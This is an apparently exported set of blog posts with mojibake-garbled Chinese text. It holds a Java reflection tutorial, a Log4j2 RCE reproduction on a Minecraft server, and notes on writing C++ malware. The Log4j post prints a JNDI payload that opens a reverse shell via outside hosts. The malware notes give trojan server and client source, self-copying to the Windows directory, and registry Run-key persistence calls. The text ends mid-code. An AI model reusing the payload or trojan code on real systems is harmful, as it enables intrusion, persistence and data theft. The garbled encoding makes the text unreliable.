å¥½å¤„ï¼š åœ¨ç¨‹åºè¿è¡Œä¸­æ“ä½œè¿™äº›å¯¹è±¡ å¯ä»¥è§£è€¦ï¼Œæé«˜ç¨‹åºå¯æ‹“å±•æ€§ Javaä»£ç è¿è¡Œé˜¶æ®µ è·å–Classå¯¹è±¡æ–¹å¼ Sourceï¼š å¯¹ç”¨äºé…ç½®æ–‡ä»¶ï¼Œå°†ç±»åå®šä¹‰åœ¨é…ç½®æ–‡ä»¶ä¸­ã€‚è¯»å–æ–‡ä»¶ï¼ŒåŠ è½½ç±» Class.forName(â€œå…¨ç±»åâ€)ï¼šå°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜è¿”å›classå¯¹è±¡ Classï¼š å¤šç”¨äºå‚æ•°ä¼ é€’ ä¾æ®ç±»åå±æ€§classï¼Œè·å–classå¯¹è±¡ Runtime å¤šç”¨äºå¯¹è±¡çš„è·å–å­—èŠ‚ç çš„æ–¹å¼ å¯¹è±¡.getClass()ï¼šæ–¹æ³•å°è£…åœ¨Objectä¸­ï¼Œè¢«æ‰€æœ‰å¯¹è±¡ç»§æ‰¿äº† åŒä¸€ä¸ªå­—èŠ‚ç æ–‡ä»¶åœ¨åŒä¸€æ¬¡ç¨‹åºè¿è¡Œä¸­ï¼Œåªä¼šè¢«åŠ è½½ä¸€æ¬¡ï¼›ä¸è®ºé€šè¿‡é‚£ç§æ–¹å¼å–å¾—ï¼Œéƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ æ¯ä¸ªç±»å¯¹è±¡éƒ½ä¸åŒ ä½¿ç”¨classå¯¹è±¡ åŠŸèƒ½ï¼š è·å–ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package LearnJunit.domain;public class Person &#123; private String name; private int age; public String a; protected String b; String c; private String d; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, a=&#x27;&quot; + a + &#x27;\\&#x27;&#x27; + &quot;, b=&#x27;&quot; + b + &#x27;\\&#x27;&#x27; + &quot;, c=&#x27;&quot; + c + &#x27;\\&#x27;&#x27; + &quot;, d=&#x27;&quot; + d + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; è·å–æˆå‘˜å˜é‡ä»¬ Field[] getFields()ï¼šè·å–æ‰€æœ‰publicæˆå‘˜å˜é‡ 1234Field[] fields = personClass.getFields();for (Field field: fields)&#123; System.out.println(field);&#125; Field getField(String name)ï¼šè·å–æ‰€æœ‰æŒ‡å®šåç§°publicæˆå‘˜å˜é‡ 1Field a = personClass.getField(&quot;a&quot;); Field[] getDeclaredFields() 12345//è·å–æ‰€æœ‰æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°Field[] DeclaredFields = personClass.getDeclaredFields();for (Field getDeclaredField: DeclaredFields)&#123; System.out.println(getDeclaredField);&#125; Field getDeclaredField(String name) åå°„ç§æœ‰ã€ä¿æŠ¤æˆå‘˜å˜é‡ï¼Œè¦è®¾ç½®å¿½ç•¥è®¿é—®æƒé™çš„ä¿®é¥°ç¬¦å®‰å…¨ç›‘æµ‹ 1234567//1.4è·å–å•ä¸ªç§æœ‰System.out.println(&quot;---------------&quot;);Field d = personClass.getDeclaredField(&quot;d&quot;);//1.4.1å¿½ç•¥å®‰å…¨è®¿é—®d.setAccessible(true);//æš´åŠ›åå°„Object value2 = d.get(p);System.out.println(value2); è·å–æ„é€ æ–¹æ³•ä»¬ Constructor&lt;?&gt;[] getConstructors() 12Constructor constructor = personClass.getConstructor(String.class, int.class);System.out.println(constructor); Constructor&lt;T&gt; getConstructor(String name) Constructor&lt;?&gt;[] getDeclaredConstructors() Constructor&lt;T&gt; getDeclaredConstructor(String name) è·å–æˆå‘˜æ–¹æ³•ä»¬ method[] getMethods() 12345//è·å–æ‰€æœ‰publicä¿®é¥°æ–¹æ³•Method[] funcs = personClass.getMethods();for (Method func:funcs)&#123; System.out.println(func);&#125; 123456789101112131415public java.lang.String LearnJunit.domain.Person.toString()public java.lang.String LearnJunit.domain.Person.getName()public void LearnJunit.domain.Person.setName(java.lang.String)public int LearnJunit.domain.Person.getAge()public void LearnJunit.domain.Person.setAge(int)public void LearnJunit.domain.Person.eat()public void LearnJunit.domain.Person.eat(java.lang.String)public final void java.lang.Object.wait() throws java.lang.InterruptedExceptionpublic final void java.lang.Object.wait(long,int) throws java.lang.InterruptedExceptionpublic final native void java.lang.Object.wait(long) throws java.lang.InterruptedExceptionpublic boolean java.lang.Object.equals(java.lang.Object)public native int java.lang.Object.hashCode()public final native java.lang.Class java.lang.Object.getClass()public final native void java.lang.Object.notify()public final native void java.lang.Object.notifyAll() å› ä¸ºPersonç±»ç»§æ‰¿çš„æ˜¯Objectå¯¹è±¡ï¼Œæ‰€ä»¥æœ‰äº›éšè—å‡½æ•°ï¼Œå³ä»Objectç»§æ‰¿ä¸‹æ¥çš„å‡½æ•° method getMethod(String name) 12345 //è·å–æŒ‡å®šæ–¹æ³•åç§°//åå­—ï¼Œå‚æ•°åˆ—è¡¨åŒ¹é… Method eat = personClass.getMethod(&quot;eat&quot;); Method eat2 = personClass.getMethod(&quot;eat&quot;,String.class); eat2.invoke(p,&quot;fish&quot;); method[] getDeclaredMethods() method getDeclaredMethod(String name) è·å–ç±»å String getName() æ“ä½œ Fieldæˆå‘˜å˜é‡ è®¾ç½®å€¼ï¼ˆgetï¼‰ 12345Field a = personClass.getField(&quot;a&quot;);//è·å–æˆå‘˜å˜é‡açš„å€¼Person p = new Person();Object value = a.get(p);System.out.println(value); è·å–å€¼ï¼ˆsetï¼‰ 12a.set(p,&quot;John&quot;);System.out.println(p); æš´åŠ›åå°„ï¼š.setAccessible(true); å¯¹æ‰€æœ‰åå°„éƒ½æœ‰æ•ˆ æ­é…getDeaclearedXXXä½¿ç”¨ è¿™ä»…ä»…æ˜¯æ‰“å°åç§°å’Œæ¯”è¾ƒï¼Œä¸éœ€è¦è®¾ç½®ï¼›ä½†æ˜¯å¦‚æœè¦å¯¹å¯¹è±¡è¿›è¡Œç›¸å…³æ“ä½œï¼Œå¿…é¡»è®¾ç½®ï¼›ä¸è®¾ç½®çš„è¯æ“ä½œå—é™ã€‚ Constructoræ„é€ æ–¹æ³• åˆ›å»ºå¯¹è±¡ T newInstance(Object... initargs) 123//1.2åˆ›å»ºå¯¹è±¡Object person = constructor.newInstance(&quot;Jonh&quot;,5);System.out.println(person); å¦‚æœæ„é€ ä½¿ç”¨ç©ºå‚åˆ›é€ å¯¹è±¡ï¼Œå¯ç®€åŒ– classå¯¹è±¡çš„ newInstance 123Object o = personClass.newInstance();System.out.println(o);System.out.println(&quot;-------------&quot;); Methodæˆå‘˜å¯¹è±¡ æ‰§è¡Œæ–¹æ³• 123456//è·å–æŒ‡å®šæ–¹æ³•åç§°Method eat = personClass.getMethod(&quot;eat&quot;);//åˆ›å»ºæ–¹æ³•å¯¹è±¡Person p = new Person();//æ‰§è¡Œæ–¹æ³•eat.invoke(p); è·å–æ–¹æ³•åç§° 1System.out.println(func.getName()); è·å–ç±»å 123//è·å–ç±»åString classname = personClass.getName();System.out.println(classname); åå°„æ¡ˆä¾‹ æ¡ˆä¾‹ï¼š éœ€æ±‚ï¼šä¸€ä¸ªæ¡†æ¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬åˆ›å»ºä»»æ„ç±»çš„å¯¹è±¡ï¼Œå¹¶ä¸”æ‰§è¡Œä»»æ„æ–¹æ³• ä¸èƒ½æ”¹å˜è¯¥ç±»çš„ä»»ä½•ä»£ç ï¼Œ åˆ›å»ºä»»æ„å¯¹è±¡æ‰§è¡Œä»»æ„æ–¹æ³• ä¸€èˆ¬æ–¹å¼ï¼š 12345678910package LearnJunit.reflect;import LearnJunit.domain.Person;//å‡è®¾æ¡†æ¶ç±»public class ReflectFramework &#123; public static void main(String[] args) &#123; //å¯ä»¥åˆ›å»ºä»»æ„ç±»å¯¹è±¡ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³• Person p = new Person(); p.eat(); &#125;&#125; è¿™é‡Œçš„æ¡†æ¶æ˜¯æå‰å­¦å¥½çš„ï¼Œä¸èƒ½æ”¹å˜ï¼›è‹¥è¦ä½¿ç”¨studentç±»ï¼Œåˆ™ä»£ç ä¼šæ”¹å˜ å®ç° é…ç½®æ–‡ä»¶ åå°„ æ­¥éª¤ å°†éœ€è¦åˆ›å»ºçš„å¯¹è±¡çš„å…¨ç±»åå’Œéœ€è¦æ‰§è¡Œçš„æ–¹æ³•å®šä¹‰åœ¨é…ç½®æ–‡ä»¶ä¸­ srcä¸­åˆ›å»ºé…ç½®æ–‡ä»¶ 12className=LearnJunit.domain.PersonmethodName=eat åœ¨ç¨‹åºä¸­åŠ è½½è¯»å–é…ç½®æ–‡ä»¶ 1234567891011//1.åŠ è½½é…ç½®æ–‡ä»¶//1.1åˆ›å»ºé…ç½®å¯¹è±¡Properties pro = new Properties();//1.2åŠ è½½é…ç½®æ–‡ä»¶ï¼Œè½¬æ¢ä¸ºé›†åˆ//1.2.1è·å–classç›®å½•ä¸‹é…ç½®æ–‡ä»¶ClassLoader classLoader = ReflectFramework.class.getClassLoader();//è·å¾—å½“å‰ç±»è·¯å¾„InputStream is = classLoader.getResourceAsStream(&quot;config.properties&quot;);//è¯»å–è·¯å¾„ä¸‹çš„config.propertiespro.load(is);//2.è·å–é…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„æ•°æ®String className = pro.getProperty(&quot;className&quot;);String methodName = pro.getProperty(&quot;methodName&quot;); ä½¿ç”¨åå°„æŠ€æœ¯æ¥åŠ è½½ç±»æ–‡ä»¶è¿›å†…å­˜ï¼Œåˆ›å»ºå¯¹è±¡å¹¶æ‰§è¡Œæ–¹æ³• 1234567//3.åŠ è½½ç±»è¿›å†…å­˜Class cls = Class.forName(className);//4.åˆ›å»ºå¯¹è±¡Object obj = cls.newInstance();//5.è·å–æ–¹æ³•å¯¹è±¡Method method = cls.getMethod(methodName);method.invoke(obj); å®Œæ•´ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package LearnJunit.reflect;import LearnJunit.domain.Person;import LearnJunit.domain.Student;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Properties;import java.util.stream.IntStream;//å‡è®¾æ¡†æ¶ç±»public class ReflectFramework &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException, NoSuchMethodException &#123; //å¯ä»¥åˆ›å»ºä»»æ„ç±»å¯¹è±¡ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³• //ä¸èƒ½æ”¹å˜è¯¥ç±»çš„ä»»ä½•ä»£ç ï¼Œ //åˆ›å»ºä»»æ„å¯¹è±¡æ‰§è¡Œä»»æ„æ–¹æ³• //1.åŠ è½½é…ç½®æ–‡ä»¶ //1.1åˆ›å»ºé…ç½®å¯¹è±¡ Properties pro = new Properties(); //1.2åŠ è½½é…ç½®æ–‡ä»¶ï¼Œè½¬æ¢ä¸ºé›†åˆ //1.2.1è·å–classç›®å½•ä¸‹é…ç½®æ–‡ä»¶ ClassLoader classLoader = ReflectFramework.class.getClassLoader(); InputStream is = classLoader.getResourceAsStream(&quot;config.properties&quot;); pro.load(is); //2.è·å–é…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„æ•°æ® String className = pro.getProperty(&quot;className&quot;); String methodName = pro.getProperty(&quot;methodName&quot;); //3.åŠ è½½ç±»è¿›å†…å­˜ Class cls = Class.forName(className); //4.åˆ›å»ºå¯¹è±¡ Object obj = cls.newInstance(); //5.è·å–æ–¹æ³•å¯¹è±¡ Method method = cls.getMethod(methodName); method.invoke(obj); &#125;&#125; è¿™æ ·åªéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶å°±å¯ä»¥äº†","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"ã€æ¼æ´å¤ç°ã€‘minecraft ä¸­çš„ log4j2 rce","slug":"log4j2-minecraft-rce","date":"2021-12-12T04:18:49.000Z","updated":"2023-08-25T03:20:05.245Z","comments":true,"path":"2021/12/12/log4j2-minecraft-rce/","link":"","permalink":"https://joe1sn.eu.org/2021/12/12/log4j2-minecraft-rce/","excerpt":"log4j è¿˜æ˜¯1dayçš„æ—¶å€™ï¼Œå¯¹minecraftæœåŠ¡å™¨è¿›è¡Œæ¼æ´è°ƒè¯•","text":"log4j è¿˜æ˜¯1dayçš„æ—¶å€™ï¼Œå¯¹minecraftæœåŠ¡å™¨è¿›è¡Œæ¼æ´è°ƒè¯• ç¯å¢ƒæ­å»º åœ¨æœåŠ¡å™¨ä¸Šæ­å»ºäº†mcæœåŠ¡ç«¯ï¼Œè¿™ä¸ªç…§ç€ç½‘ä¸Šçš„æ•™ç¨‹åšçš„ è¿™é‡Œç”¨çš„ä¸æ˜¯å®˜æ–¹åŒ…ï¼Œè€Œæ˜¯è¿™ä¸ªï¼šhttps://www.joe1sn.top/server.jar javaç‰ˆæœ¬æ˜¯ 123openjdk version &quot;1.8.0_162&quot;OpenJDK Runtime Environment (build 1.8.0_162-8u162-b12-1-b12)OpenJDK 64-Bit Server VM (build 25.162-b12, mixed mode) ç‰¹æ„æ¢çš„è€ç‰ˆæœ¬ å¼€å§‹æ”»å‡» è¿™é‡Œä½¿ç”¨äº†https://github.com/feihong-cs/JNDIExploitè¿™ä¸ªå·¥å…· åœ¨æœ¬åœ°æ­å»ºngrokä»£ç†æœ¬åœ°çš„ç›‘å¬ç«¯å£ ç„¶åç”Ÿæˆåˆ©ç”¨EXP 1$&#123;jndi:ldap://150.158.75.102:1389/Basic/ReverseShell/3.133.207.110/13605&#125; ç™»é™†æœåŠ¡å™¨åœ¨èŠå¤©æ¡†ä¸­è¾“å…¥ å›è½¦ç­‰å¾…ågetshell ä½†æ˜¯æœåŠ¡å™¨ä¼šå´©æºƒ ä¸Šé¢çš„payloadå´©æºƒäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œä½†æ˜¯å…¶ä»–çº¿ç¨‹ä»ç„¶åœ¨è¿è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨kill -9æ‰èƒ½å…³é—­","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://joe1sn.eu.org/tags/cve/"},{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"ã€å…æ€ã€‘C++æ¶æ„è½¯ä»¶å…¥é—¨ç¬”è®°","slug":"Maleware","date":"2021-03-30T03:01:00.000Z","updated":"2023-06-13T05:13:20.740Z","comments":true,"path":"2021/03/30/Maleware/","link":"","permalink":"https://joe1sn.eu.org/2021/03/30/Maleware/","excerpt":"C++æ¶æ„è½¯ä»¶å…¥é—¨ç¬”è®°ï¼Œé«˜ä¸­çœ‹çš„ä¸€æœ¬ä¹¦ï¼Œå¤§äºŒå°å°å®è·µä¸€ä¸‹","text":"C++æ¶æ„è½¯ä»¶å…¥é—¨ç¬”è®°ï¼Œé«˜ä¸­çœ‹çš„ä¸€æœ¬ä¹¦ï¼Œå¤§äºŒå°å°å®è·µä¸€ä¸‹ ç®€å•çš„Windows API å¤åˆ¶è‡ªèº«åˆ°Windowsç›®å½• 1-1.è·å¾—ç¨‹åºè‡ªç”ŸAPI DWORD GetModuleFileName 1-2.è·å¾—windowsç›®å½• UINT GetWindowsDirectory 1-3.æ‹·è´æ–‡ä»¶ BOOL CopyFile è·å¾—ç³»ç»ŸåŸºæœ¬å‚æ•° 2-1.è·å¾—æ“ä½œç³»ç»Ÿç‰ˆæœ¬ BOOL GetVersionEx typedef struct _OSVERSIONINFOA &#123; DWORD dwOSVersionInfoSize; DWORD dwMajorVersion; DWORD dwMinorVersion; DWORD dwBuildNumber; DWORD dwPlatformId; CHAR szCSDVersion[128]; // Maintenance string for PSS usage &#125; OSVERSIONINFOA, * POSVERSIONINFOA, * LPOSVERSIONINFOA; &lt;!--codeï¿¼0--&gt; TCP//IPè¿æ¥æœ¨é©¬ ç®€å•çš„TCP/IPæµ‹è¯• server 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;Winsock2.h&gt;#pragma comment (lib, &quot;ws2_32&quot;)using namespace std;//é“¾æ¥dll// ä½¿ç”¨è¯¥å‡½æ•°æ¥åˆå§‹åŒ–ws2_32.dll//int WSAStartup//é‡Šæ”¾Dll// int WSACleanuo(void)//åˆ›å»ºçš„å¥—æ¥å­—// SOCKET socket// (WSAAPI* LPFN_SOCKET)(// _In_ int af, //é€šè®¯åè®®ç°‡// _In_ int type, //è¦åˆ›å»ºçš„å¥—æ¥å­—ç±»å‹// _In_ int protocol //æŒ‡å®šç¨‹åºæ‰€ç”¨çš„é€šè®¯åè®®// );//å…³é—­å¥—æ¥å­—// closesocket//ç»‘å®šIPå’Œç«¯å£// int bind (SOCKET s, socketaddr, int namelen)//WSAStartup-&gt;socket-&gt;bind-&gt;listen-&gt;accept-&gt;send/recv-&gt;closesocket-&gt;WSACleanupint main()&#123; //1.åˆå§‹åŒ–ws2_32.dll WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &amp;wsaData); //2.åˆ›å»ºsocketå¥—æ¥å­— // é€šè®¯åè®®ç°‡ å¥—æ¥å­—ç±»å‹ é€šè®¯åè®® SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //socketå¯¹è±¡ s sockaddr_in sockaddr; //socket ç­‰å¾…å¯¹è±¡sockaddr sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);//ç‚¹åœ°å€ sockaddr.sin_port = htons(1000); //è®¾ç½®ç«¯å£ //3.ç»‘å®šipå’Œç«¯å£ bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //å°†socket s è®¾ç½®ä¸ºsocketaddrç±»å‹ //4.ç›‘å¬ listen(s, 1); cout &lt;&lt; &quot;Start Listenning\\n&quot;; //4.ç­‰å¾…è¿æ¥ SOCKADDR clientAddr; int nSize = sizeof(SOCKADDR); SOCKET clientSock; clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//åˆ›å»ºè¿æ¥å¯¹è±¡ cout &lt;&lt; &quot;Client is on!\\n&quot;; //5.recv || send char msg[] = &quot;hello from server\\n&quot;; send(clientSock, msg, strlen(msg)+sizeof(char), NULL); cout &lt;&lt; &quot;Sending Message\\n&quot;; //6.æ–­å¼€Socket closesocket(clientSock); closesocket(s); cout &lt;&lt; &quot;Connection close\\n&quot;; //7.é‡Šæ”¾ws2_32åº“ WSACleanup(); cout &lt;&lt; &quot;Resorces clean\\n&quot;; return 0;&#125; client 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#pragma comment (lib,&quot;ws2_32&quot;)using namespace std;//WSAstartup-&gt;socket-&gt;connect-&gt;recv/send-&gt;closesocket-&gt;WSACleanupint main()&#123; //1.åˆå§‹åŒ–DLL WSADATA wsaData; WSAStartup(MAKEWORD(2,2),&amp;wsaData); //2.åˆ›å»ºSocketé“¾æ¥å¯¹è±¡ SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.è¿æ¥åˆ°server connect(s, (SOCKADDR *) &amp;sockaddr, sizeof(SOCKADDR)); //4.è®¾ç½®æ•°æ®ç¼“å†²åŒº char szBuffer[MAXBYTE]; recv(s, szBuffer, MAXBYTE, NULL); cout &lt;&lt; &quot;This is msg from server\\n&quot;; cout &lt;&lt; &quot; &quot; &lt;&lt; szBuffer; //5.å…³é—­socket closesocket(s); WSACleanup(); return 0;&#125; SimpleTCPTorjan server 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;cstring&gt;#pragma comment (lib, &quot;ws2_32&quot;)using namespace std;const int MaxBuf = 0x50;//1.å®ŒæˆåŠŸèƒ½å‘½ä»¤çš„å‘é€//2.å¯ä»¥æŸ¥çœ‹è¿œç¨‹ä¸»æœºçš„ç›¸å…³ä¿¡æ¯ï¼Œä»¥åŠå¤åˆ¶è‡ªèº«åˆ°å¯æ‰§è¡Œç›®å½•//3.æ‰“å¼€/å…³é—­å…‰é©±//4.äº¤æ¢å’Œæ¢å¤é¼ æ ‡å·¦å³é”®//å®å®šä¹‰å¸®åŠ©èœå•#define HELP &quot;help - Show Help Menu\\n&quot; \\ &quot;getsysinfo - Get System Info\\n&quot; \\ &quot;open - Open The CDRom\\n&quot; \\ &quot;close - Close The CSRom\\n&quot; \\ &quot;swap - Swap Mouse Button\\n&quot; \\ &quot;restore - Restore Mouse Button\\n&quot; \\ &quot;exit - Quit Shell\\n&quot;int main()&#123; //1.åˆå§‹åŒ–DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //2.åˆ›å»ºSocketé“¾æ¥å¯¹è±¡ SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.ç»‘å®šipå’Œç«¯å£ bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //å°†socket s è®¾ç½®ä¸ºsocketaddrç±»å‹ listen(s, 1); //4.ç­‰å¾…è¿æ¥ SOCKADDR clientAddr; int nSize = sizeof(SOCKADDR); SOCKET clientSock; clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//åˆ›å»ºè¿æ¥å¯¹è±¡ cout &lt;&lt; &quot;Client is on!\\n&quot;; //å¼€å§‹ç›‘å¬ char CMD[MaxBuf]; char recver[MaxBuf]; memset(CMD, 0, MaxBuf); while (1) &#123; cin &gt;&gt; CMD; if (!strcmp(CMD, &quot;help&quot;)) cout &lt;&lt; HELP &lt;&lt; endl; else if (!strcmp(CMD, &quot;getsysinfo&quot;)) &#123; send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL); char temp[MaxBuf]; memset(temp, 0, MaxBuf); recv(s, temp, strlen(temp) + sizeof(char), NULL); memset(temp, 0, MaxBuf); recv(s, temp, strlen(temp) + sizeof(char), NULL); cout &lt;&lt; &quot;recved?\\n&quot;; cout &lt;&lt; temp &lt;&lt;endl; &#125; else send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL); memset(CMD, 0, MaxBuf); &#125; //6.æ–­å¼€Socket closesocket(clientSock); closesocket(s); cout &lt;&lt; &quot;Connection close\\n&quot;; //7.é‡Šæ”¾ws2_32åº“ WSACleanup(); cout &lt;&lt; &quot;Resorces clean\\n&quot;; return 0;&#125; client 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;windows.h&gt;#pragma comment (lib,&quot;ws2_32&quot;)using namespace std;const int MaxBuf = 0x50;//æ‰“å¼€æˆ–å…³é—­å…‰é©±//VOID SetCdaudio(BOOL bOpen)//&#123;// if (bOpen)// mciSendStringA(&quot;set cdaudio door open&quot;,NULL,NULL,NULL);// else// mciSendStringA(&quot;set cdaudio door clsoed&quot;, NULL, NULL, NULL);//&#125;VOID MouseSwap(BOOL bSwap)&#123; if (bSwap) SwapMouseButton(TRUE); else SwapMouseButton(FALSE);&#125;//å¯¹å‘½ä»¤è¿›è¡Œè§£æBOOL Dispatch(SOCKET &amp;sock, char* szCmd)&#123; BOOL bRet = FALSE; if (!strcmp(szCmd, &quot;getsysinfo&quot;)) &#123; char szComputerName[MaxBuf]; char szUserName[MaxBuf]; DWORD buffer1 = MaxBuf; GetComputerNameA(szComputerName, &amp;buffer1); DWORD buffer2 = MaxBuf; GetUserNameA(szUserName, &amp;buffer2); strcat(szUserName, &quot;@&quot;); strcat(szUserName, szComputerName); cout &lt;&lt; szUserName &lt;&lt; endl; send(sock, szUserName, strlen(szUserName) + sizeof(char),NULL); bRet = 1; &#125; //else if (!strcmp(szCmd, &quot;open&quot;)) //&#123; // SetCdaudio(1); // bRet = 1; //&#125; //else if (!strcmp(szCmd, &quot;clsoe&quot;)) //&#123; // SetCdaudio(0); // bRet = 1; //&#125; else if (!strcmp(szCmd, &quot;swap&quot;)) &#123; MouseSwap(1); bRet = 1; &#125; else if (!strcmp(szCmd, &quot;restore&quot;)) &#123; MouseSwap(0); bRet = 1; &#125; else if (!strcmp(szCmd, &quot;exit&quot;)) exit(0); else bRet = 0; return bRet;&#125;int main()&#123; //1.åˆå§‹åŒ–DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //2.åˆ›å»ºSocketé“¾æ¥å¯¹è±¡ SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.è¿æ¥åˆ°server connect(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //4.è®¾ç½®æ•°æ®ç¼“å†²åŒº char szBuffer[MAXBYTE]; memset(szBuffer, 0, MaxBuf); while (1) &#123; if (s) &#123; recv(s, szBuffer, MAXBYTE, NULL); cout &lt;&lt; szBuffer &lt;&lt; endl; Dispatch(s, szBuffer); memset(szBuffer, 0, MaxBuf); &#125; &#125; //5.å…³é—­socket closesocket(s); WSACleanup(); return 0;&#125; clientå›ä¼ è®¡ç®—æœºç›¸å…³ä¿¡æ¯æœ‰é—®é¢˜ Windowsæ–‡ä»¶æ“ä½œç›¸å…³API æ³¨å†Œè¡¨ç›¸å…³ 1.æ‰“å¼€æ³¨å†Œè¡¨ 12345678WINADVAPILSTATUSAPIENTRYRegOpenKeyA ( _In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _Out_ PHKEY phkResult ); ä½¿ç”¨ 12HKEY hKey;long lRet = RegOpenKey(keysname, REG_RUN, &amp;hKey); 2.æ³¨å†Œè¡¨æŸ¥è¯¢ https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya 1234567891011121314151617WINADVAPILSTATUSAPIENTRYRegQueryInfoKeyA( _In_ HKEY hKey, //å­é”®å¥æŸ„ _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass, //æŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œè¯¥ç¼“å†²åŒºæ¥æ”¶ç”¨æˆ·å®šä¹‰çš„é”®ç±»ã€‚æ­¤å‚æ•°å¯ä»¥ä¸ºNULLã€‚ _Inout_opt_ LPDWORD lpcchClass, //è¯¥å˜é‡æŒ‡å®šlpClasså‚æ•°æŒ‡å‘çš„ç¼“å†²åŒºçš„å¤§å° _Reserved_ LPDWORD lpReserved, //æ­¤å‚æ•°æ˜¯ä¿ç•™å‚æ•°ï¼Œå¿…é¡»ä¸ºNULLã€‚ _Out_opt_ LPDWORD lpcSubKeys, //æŒ‡å‘ä¸€ä¸ªå˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡æ¥æ”¶æŒ‡å®šé”®æ‰€åŒ…å«çš„å­é”®çš„æ•°é‡ã€‚æ­¤å‚æ•°å¯ä»¥ä¸ºNULL _Out_opt_ LPDWORD lpcbMaxSubKeyLen,//æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡ä»¥æœ€é•¿çš„åç§°æ¥æ”¶é”®çš„å­é”®çš„å¤§å°ï¼Œä»¥Unicodeå­—ç¬¦è¡¨ç¤ºï¼Œä¸åŒ…æ‹¬ç»ˆæ­¢çš„ç©ºå­—ç¬¦ _Out_opt_ LPDWORD lpcbMaxClassLen,//æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡æ¥æ”¶ä»¥Unicodeå­—ç¬¦è¡¨ç¤ºçš„æŒ‡å®šå­é¡¹ç±»çš„æœ€é•¿å­—ç¬¦ä¸²çš„å¤§å° _Out_opt_ LPDWORD lpcValues, //æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡æ¥æ”¶ä¸é”®å…³è”çš„å€¼çš„æ•°é‡ _Out_opt_ LPDWORD lpcbMaxValueNameLen,//æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡æ¥æ”¶é”®çš„æœ€é•¿å€¼åç§°çš„å¤§å°ï¼ˆä»¥Unicodeå­—ç¬¦è¡¨ç¤ºï¼‰ _Out_opt_ LPDWORD 